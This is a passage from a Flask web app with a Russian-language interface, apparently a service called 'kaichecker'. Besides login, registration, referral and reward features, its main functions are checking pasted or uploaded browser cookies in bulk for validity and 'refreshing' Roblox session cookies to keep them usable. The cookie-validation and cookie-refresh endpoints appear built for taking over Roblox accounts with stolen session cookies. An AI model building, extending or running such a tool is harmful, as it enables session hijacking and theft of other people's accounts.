                        <input type="text" value="https://kaichecker.com/login/?ref={{ user.id }}" id="refLink" readonly>
                    </div>
                    <button class="btn btn-primary" style="width:100%;margin-top:10px;" onclick="navigator.clipboard.writeText(document.getElementById('refLink').value);alert('Ссылка скопирована!');">Скопировать</button>
                </div>

                <div class="card">
                    <h2>🎖️ Награды</h2>
                    <div style="display:flex;gap:10px;">
                        <div class="achieve-card" style="flex:1;"><div class="icon">🛡️</div><div class="title">Искра Новичка</div></div>
                        <div class="achieve-card" style="flex:1;"><div class="icon">🔮</div><div class="title">Сигил Потока</div></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function toggleProfileMenu() {
    document.getElementById('profileMenu').classList.toggle('show');
}

function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
    const targetContent = document.getElementById('tab-' + tabName);
    if(targetBtn && targetContent) {
        targetBtn.classList.add('active'); targetContent.classList.add('active');
        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
});

async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return alert('Вставьте кук!');
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';
    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if(!file) return alert('Выберите файл!');
    const fd = new FormData(); fd.append('file', file);
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('massResult').textContent = '⏳ Чек...';
    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    if(data.success) { document.getElementById('massResult').textContent = data.results.join('\n\n'); }
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    if(!cookies) return alert('Вставьте куки!');
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies, mode:'duplicate'}) });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

async function loadCheckerHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.forEach((i) => {
        html += `<div style="background:var(--input-bg);padding:12px;border-radius:12px;margin-bottom:10px;">🕒 ${i.timestamp} — Валид: ${i.valid}/${i.total}<pre style="margin-top:6px;font-size:11px;">${i.results ? i.results.join('\n') : ''}</pre></div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
}

async function loadFresherHistory() {
    const res = await fetch('/api/history/fresher');
    const data = await res.json();
    let html = '';
    data.history.forEach((i) => {
        html += `<div style="background:var(--input-bg);padding:12px;border-radius:12px;margin-bottom:10px;">🕒 ${i.timestamp} — Обновлено: ${i.refreshed_count} шт.<pre style="margin-top:6px;font-size:11px;">${i.cookies ? i.cookies.join('\n') : ''}</pre></div>`;
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
}

async function clearHistory(type) {
    if(!confirm('Очистить историю?')) return;
    const res = await fetch(`/api/history/clear/${type}`, { method: 'POST' });
    if((await res.json()).success) {
        if(type==='checker') loadCheckerHistory(); else loadFresherHistory();
    }
}
</script>
</body>
</html>"""

# ==========================================
# ROUTES
# ==========================================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, password FROM users WHERE username=?", (username,))
        row = c.fetchone()
        conn.close()
        
        if row and check_password_hash(row[1], password):
            session['logged_in'] = True
            session['user_id'] = row[0]
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return render_template_string(AUTH_HTML, mode='login', error="Неверный логин или пароль")
            
    return render_template_string(AUTH_HTML, mode='login')

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        
        if not username or not email or not password:
            return render_template_string(AUTH_HTML, mode='register', error="Заполните все поля")
            
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            hashed_pass = generate_password_hash(password)
            now_str = datetime.now().strftime('%d.%m.%Y')
            c.execute("INSERT INTO users (username, email, password, created_at) VALUES (?, ?, ?, ?)",
                      (username, email, hashed_pass, now_str))
            conn.commit()
            conn.close()
            return render_template_string(AUTH_HTML, mode='login', success="Регистрация успешна! Войдите в аккаунт.")
        except sqlite3.IntegrityError:
            conn.close()
            return render_template_string(AUTH_HTML, mode='register', error="Логин или Gmail уже заняты")
            
    return render_template_string(AUTH_HTML, mode='register')

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route("/")
@login_required
def index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, username, email, xp, level, balance, checks_count FROM users WHERE id=?", (session['user_id'],))
    row = c.fetchone()
    conn.close()
    
    user_data = {
        'id': row[0], 'username': row[1], 'email': row[2],
        'xp': row[3], 'level': row[4], 'balance': row[5], 'checks_count': row[6]
    } if row else {'id': 1, 'username': 'Guest', 'email': 'guest@gmail.com', 'xp': 0, 'level': 1, 'balance': 0, 'checks_count': 0}

    return render_template_string(INDEX_HTML, username=session.get('username'), user=user_data)

@app.route("/api/single-check", methods=["POST"])
@login_required
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0, 'usernames': [info['Username']], 'results': [report], 'full_reports': []})
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
@login_required
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']
    formatted = [format_quick_report(r) for r in results]
    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'usernames': [], 'results': formatted, 'full_reports': []})
    return jsonify({"success": True, "results": formatted})

@app.route("/api/fresher", methods=["POST"])
@login_required
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    only_cookies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c) for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res['success'] and res['new_cookie']: only_cookies.append(res['new_cookie'])
    add_fresher_history({'mode': 'duplicate', 'refreshed_count': len(only_cookies), 'usernames': [], 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
@login_required
def api_history_checker():
    return jsonify({"history": get_checker_history()})

@app.route("/api/history/fresher")
@login_required
def api_history_fresher():
    return jsonify({"history": get_fresher_history()})

@app.route("/api/history/clear/<type>", methods=["POST"])
@login_required
def api_clear_history(type):
    if type == "checker": clear_checker_history()
    elif type == "fresher": clear_fresher_history()
    return jsonify({"success": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
